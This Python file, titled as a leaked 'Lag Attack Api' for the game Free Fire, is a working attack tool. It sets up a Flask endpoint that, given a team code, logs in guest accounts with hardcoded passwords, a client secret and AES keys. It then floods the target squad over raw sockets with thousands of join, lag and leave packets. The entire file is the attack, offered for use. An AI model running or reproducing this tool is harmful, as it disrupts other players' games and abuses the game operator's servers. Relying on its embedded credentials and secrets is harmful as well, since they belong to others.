# Leak Full Source Lag Attack Api
# Following: ( @jocker_90a - Senzu.! )
# Create date : 2025-09-12
# ============= main ==============
import threading
import json
import requests
import time
import logging
import socket
import sys
import base64
import os
from datetime import datetime
from threading import Thread
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from google.protobuf.timestamp_pb2 import Timestamp
import urllib3
from flask import Flask, request, jsonify
#
try:
    import MajorLg
    from utils import create_protobuf_packet 
except ImportError:
    logging.error("error: thiếu file..!")

# --- Global ---
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)s | %(message)s')

FREEFIRE_VERSION = "OB52"
CLIENT_SECRET = "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3"
PAYLOAD_TOKEN_TEMPLATE = "3a07312e3131382e31aa01026172b201203535656437353966636639346638353831336535376232656338343932663563ba010134ea0140366662376664656638363538666430333137346564353531653832623731623231646238313837666130363132633865616631623633616136383766316561659a060134a2060134ca03203734323862323533646566633136343031386336303461316562626665626466"

app = Flask(__name__)

# --- Utility Functions
def aes_encrypt(data_hex, key, iv):
    try:
        key = key if isinstance(key, bytes) else bytes.fromhex(key)
        iv = iv if isinstance(iv, bytes) else bytes.fromhex(iv)
        data = bytes.fromhex(data_hex) if isinstance(data_hex, str) else data_hex
        cipher = AES.new(key, AES.MODE_CBC, iv)
        cipher_text = cipher.encrypt(pad(data, AES.block_size))
        return cipher_text.hex()
    except Exception as e:
        logging.error(f"Encryption Error: {e}")
        return None

def encrypt_api(plain_text_hex):
    try:
        key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
        iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
        return aes_encrypt(plain_text_hex, key, iv)
    except Exception:
        return None

def dec_to_hex(number):
    hex_val = hex(int(number))[2:]
    return f"0{hex_val}" if len(hex_val) % 2 != 0 else hex_val

# --- Main Client Class
class FFClient(threading.Thread):
    def __init__(self, uid, password, teamcode, ip, port):
        super().__init__()
        self.uid = uid
        self.password = password
        self.teamcode = teamcode
        self.ip = ip
        self.port = port
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)',
            'Connection': 'keep-alive'
        })
        self.key = None
        self.iv = None
        self.is_running = True
        self.sock = None

    def parse_login_response(self, serialized_data):
        try:
            res = MajorLg.MajorLoginRes()
            res.ParseFromString(serialized_data)
            timestamp_obj = Timestamp()
            timestamp_obj.FromNanoseconds(res.kts)
            combined_timestamp = timestamp_obj.seconds * 1_000_000_000 + timestamp_obj.nanos
            self.key = res.ak
            self.iv = res.aiv
            return res.token, res.ak, res.aiv, combined_timestamp
        except Exception as e:
            logging.error(f"Parse Login Error: {e}")
            return None, None, None, None

    def prepare_packet(self, fields):
        try:
            packet_raw = create_protobuf_packet(fields).hex()
            encrypted_payload = aes_encrypt(packet_raw, self.key, self.iv)
            header_len = len(encrypted_payload) // 2
            header_hex = dec_to_hex(header_len)
            prefix = "051500" + "0" * (6 - len(header_hex))
            return bytes.fromhex(prefix + header_hex + encrypted_payload)
        except Exception:
            return None

    def pkt_lag_squad(self):
        return self.prepare_packet({1: 15, 2: {1: 1351422081, 2: 1}})

    def pkt_leave_squad(self):
        return self.prepare_packet({1: 7, 2: {1: 12263472229}})

    def pkt_join_team(self, code):
        return self.prepare_packet({
            1: 4,
            2: {
                4: bytes.fromhex("01090a0b121920"),
                5: str(code),
                6: 6, 8: 1, 9: {2: 842, 6: 11, 8: "1.111.11", 9: 6, 10: 1}
            }
        })

    def get_guest_token(self):
        url = "https://100067.connect.garena.com/oauth/guest/token/grant"
        payload = {
            "uid": self.uid, "password": self.password,
            "response_type": "token", "client_type": "2",
            "client_secret": CLIENT_SECRET, "client_id": "100067",
        }
        try:
            resp = self.session.post(url, data=payload, timeout=10)
            data = resp.json()
            return data.get('access_token'), data.get('open_id')
        except Exception as e:
            logging.error(f"Guest Token Error: {e}")
            return None, None

    def major_login(self, old_token, new_token, old_openid, new_openid):
        url = "https://loginbp.ggwhitehawk.com/MajorLogin"
        headers = {
            'X-Unity-Version': '2018.4.11f1', 'ReleaseVersion': FREEFIRE_VERSION,
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-GA': 'v1 1', 'Host': 'loginbp.ggblueshark.com'
        }
        try:
            payload_bytes = bytes.fromhex(PAYLOAD_TOKEN_TEMPLATE)
            payload_bytes = payload_bytes.replace(old_openid.encode(), new_openid.encode())
            payload_bytes = payload_bytes.replace(old_token.encode(), new_token.encode())
            encrypted_payload = encrypt_api(payload_bytes.hex())
            
            resp = self.session.post(url, headers=headers, data=bytes.fromhex(encrypted_payload), verify=False, timeout=10)
            if resp.status_code == 200 and len(resp.content) > 10:
                return self.parse_login_response(resp.content)
            return None, None, None, None
        except Exception:
            return None, None, None, None

    def connect_and_spam(self, host, port, token_packet):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((host, int(port)))
            self.sock.send(bytes.fromhex(token_packet))
            logging.info(f"✅ [{self.uid}] | Connected.")

            pkt_join = self.pkt_join_team(self.teamcode)
            pkt_lag = self.pkt_lag_squad()
            pkt_leave = self.pkt_leave_squad()

            if not pkt_join: return
            
            count = 0
            # loop spam
            while self.is_running and count < 2222: 
                try:
                    self.sock.send(pkt_join)
                    self.sock.send(pkt_lag)
                    self.sock.send(pkt_leave)
                    time.sleep(0.01)
                    count += 1
                except socket.error:
                    break
        except Exception as e:
            logging.error(f"❌ [{self.uid}] | Socket Error: {e}")
        finally:
            if self.sock: self.sock.close()

    def run(self):
        new_access_token, new_open_id = self.get_guest_token()
        if not new_access_token: return

        old_access = "6fb7fdef8658fd03174ed551e82b71b21db8187fa0612c8eaf1b63aa687f1eae"
        old_open = "55ed759fcf94f85813e57b2ec8492f5c"
        base64_token, key, iv, ts = self.major_login(old_access, new_access_token, old_open, new_open_id)
        if not base64_token: return

        try:
            jwt_parts = base64_token.split('.')
            payload_part = jwt_parts[1] + '=' * (-len(jwt_parts[1]) % 4)
            decoded_jwt = json.loads(base64.urlsafe_b64decode(payload_part))
            acc_id = decoded_jwt['account_id']
            
            encoded_acc = hex(acc_id)[2:]
            time_hex = dec_to_hex(ts)
            token_hex = base64_token.encode().hex()
            encrypted_token = aes_encrypt(token_hex, self.key, self.iv)
            head_len_hex = hex(len(encrypted_token) // 2)[2:]
            
            acc_len = len(encoded_acc)
            zeros = '0' * (16 - acc_len)
            if acc_len == 9: zeros = '0000000'
            elif acc_len == 8: zeros = '00000000'
            elif acc_len == 10: zeros = '000000'
            elif acc_len == 7: zeros = '000000000'
            
            login_header = f'0115{zeros}{encoded_acc}{time_hex}00000{head_len_hex}'
            final_login_packet = login_header + encrypted_token
            self.connect_and_spam(self.ip, self.port, final_login_packet)
        except Exception as e:
            logging.error(f"Run Error: {e}")

accounts = [
    {"id": "4302341678", "pass": "72AFB4CF19CD71BF748FB8131E4D16CCECFF16E2CE11832F24E34DB2808CA1EC", "ip": "103.108.103.33", "port": 39699},
    {"id": "4322135387", "pass": "BY_PARAHEX-L6MMP3JOA-REDZED", "ip": "103.108.103.28", "port": 39699}
]

# --- Flask Routes ---
@app.route('/')
def home():
    return "API is running. Use /lag?code=team_code"

@app.route('/lag', methods=['GET'])
def trigger_lag():
    code = request.args.get('code')
    if not code:
        return jsonify({"status": "error", "message": "Thiếu parameter 'code team'"}), 400
    try:
        team_code = int(code) 
    except ValueError:
        return jsonify({"status": "error", "message": "Code phải là số"}), 400
    logging.info(f"Nhận lệnh lag cho Team Code: {team_code}")
    active_threads = []
    for acc in accounts:
        t = FFClient(acc['id'], acc['pass'], team_code, acc['ip'], acc['port'])
        t.daemon = True
        t.start()
        active_threads.append(acc['id'])
        time.sleep(0.5)

    return jsonify({
        "status": "success",
        "message": f"Lag Attack Sending ..!",
        "target_code": team_code,
        "accounts": active_threads,
        "Create": "@Senzu01001"
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)